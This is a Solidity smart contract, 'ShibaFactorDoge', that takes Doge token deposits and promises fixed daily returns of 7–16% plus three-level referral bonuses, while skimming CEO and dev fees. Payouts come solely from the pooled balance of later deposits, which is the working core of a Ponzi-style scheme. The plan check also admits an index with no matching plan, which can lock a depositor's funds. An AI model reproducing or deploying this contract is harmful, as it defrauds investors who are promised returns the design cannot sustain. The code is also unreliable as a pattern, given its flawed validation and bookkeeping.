/**
 *Submitted for verification at BscScan.com on 2021-12-16
*/

pragma solidity 0.5.10;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library SafeERC20 {
    using SafeMath for uint;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(isContract(address(token)), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

contract ShibaFactorDoge {
	using SafeMath for uint256;
	using SafeERC20 for IERC20;

	address private tokenAddr = 0xbA2aE424d960c26247Dd6c32edC70B295c744C43; // Doge
	IERC20 public token;

	uint256 constant public INVEST_MIN_AMOUNT = 50 * 10**8; // 50 Doge 
	uint256[] public REFERRAL_PERCENTS = [70, 20, 10];
	uint256 constant public TOTAL_REF = 100;
	uint256 constant public CEO_FEE = 80;
	uint256 constant public DEV_FEE = 20;
	uint256 constant public REINVEST_BONUS = 50;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalInvested;
	uint256 public totalReferral;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[3] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
	}

	mapping (address => User) internal users;

	uint256 public startDate;

	address payable public ceoWallet;
	address payable public devWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);
	event Withdrawn(address indexed user, uint256 amount, uint256 time);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable ceoAddr, address payable devAddr, uint256 start) public {
		require(!isContract(ceoAddr) && !isContract(devAddr));
		ceoWallet = ceoAddr;
		devWallet = devAddr;

		token = IERC20(tokenAddr);

		if(start>0){
			startDate = start;
		}
		else{
			startDate = block.timestamp;
		}

        plans.push(Plan(7,  160));
        plans.push(Plan(15, 90));
        plans.push(Plan(30, 70));
	}

	function invest(address referrer, uint8 plan , uint256 amount) public {
		require(block.timestamp > startDate, "contract does not launch yet");
		require(amount >= INVEST_MIN_AMOUNT);
        require(plan < 4, "Invalid plan");

		require(amount <= token.allowance(msg.sender, address(this)));
		token.safeTransferFrom(msg.sender, address(this), amount);

		uint256 ceo = amount.mul(CEO_FEE).div(PERCENTS_DIVIDER);
		uint256 dFee = amount.mul(DEV_FEE).div(PERCENTS_DIVIDER);
		token.safeTransfer(ceoWallet, ceo);
		token.safeTransfer(devWallet, dFee);
		emit FeePayed(msg.sender, ceo.add(dFee));

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 refAmount = amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(refAmount);
					users[upline].totalBonus = users[upline].totalBonus.add(refAmount);
					totalReferral = totalReferral.add(refAmount);
					emit RefBonus(upline, msg.sender, i, refAmount);
					upline = users[upline].referrer;
				} else break;
			}
		}else{
			uint256 refAmount = amount.mul(TOTAL_REF).div(PERCENTS_DIVIDER);
			token.safeTransfer(ceoWallet, refAmount);
			totalReferral = totalReferral.add(refAmount);
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(plan, amount, block.timestamp));

		totalInvested = totalInvested.add(amount);

		emit NewDeposit(msg.sender, plan, amount, block.timestamp);
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		require(user.checkpoint.add(TIME_STEP) < block.timestamp, "only once a day");

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = token.balanceOf(address(this));
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);
		
		token.safeTransfer(msg.sender, totalAmount);

		emit Withdrawn(msg.sender, totalAmount, block.timestamp);
	}

	function reinvest(uint8 plan) public {
		User storage user = users[msg.sender];

		require(user.checkpoint.add(TIME_STEP) < block.timestamp, "only once a day");

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 ceo = totalAmount.mul(CEO_FEE).div(PERCENTS_DIVIDER);
		token.safeTransfer(ceoWallet, ceo);
		emit FeePayed(msg.sender, ceo);

		totalAmount = totalAmount.add(totalAmount.mul(REINVEST_BONUS).div(PERCENTS_DIVIDER));

		require(block.timestamp > startDate, "contract does not launch yet");
		require(totalAmount >= INVEST_MIN_AMOUNT);
        require(plan < 4, "Invalid plan");

		user.deposits.push(Deposit(plan, totalAmount, block.timestamp));
		totalInvested = totalInvested.add(totalAmount);

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);

		emit NewDeposit(msg.sender, plan, totalAmount, block.timestamp);
	}

	function getContractBalance() public view returns (uint256) {
		return token.balanceOf(address(this));
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[3] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalReferral);
	}

	function getUserInfo(address userAddress) public view returns(uint256 checkpoint, uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserCheckpoint(userAddress), getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}